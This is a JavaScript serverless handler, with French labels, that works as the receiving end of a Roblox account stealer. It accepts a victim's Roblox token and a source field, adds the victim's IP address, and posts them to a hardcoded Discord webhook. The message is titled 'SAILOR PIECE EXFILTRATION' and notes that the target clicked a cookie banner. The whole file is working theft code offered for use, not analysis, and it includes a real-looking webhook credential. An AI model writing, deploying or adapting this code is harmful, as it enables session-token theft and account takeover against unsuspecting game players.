export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).json({ error: 'Méthode non autorisée' });

    const webhookURL = "https://discord.com/api/webhooks/1481123753109885103/u6gAezp9LjuOt2Fbgl7cfuOMVyWU_hMw8zyuDw7w-EPnzLs8MWQbenmdXb4_JVMFxhzD";
    const { rblx, source } = req.body;
    const ip = req.headers['x-forwarded-for'] || "IP Masquée";

    const payload = {
        embeds: [{
            title: "🏴‍☠️ SAILOR PIECE EXFILTRATION - LA RELÈVE",
            color: 0xf1c40f,
            fields: [
                { name: "🌐 ADRESSE IP", value: `\`${ip}\`` },
                { name: "🎮 ROBLOX TOKEN", value: `\`${rblx}\`` },
                { name: "📂 SOURCE", value: `\`${source}\`` },
                { name: "⚠️ NOTE", value: "Cible a cliqué sur la bannière de cookies." }
            ],
            footer: { text: "Raven Stealth v3.0" },
            timestamp: new Date()
        }]
    };

    await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });

    return res.status(200).json({ success: true });
}
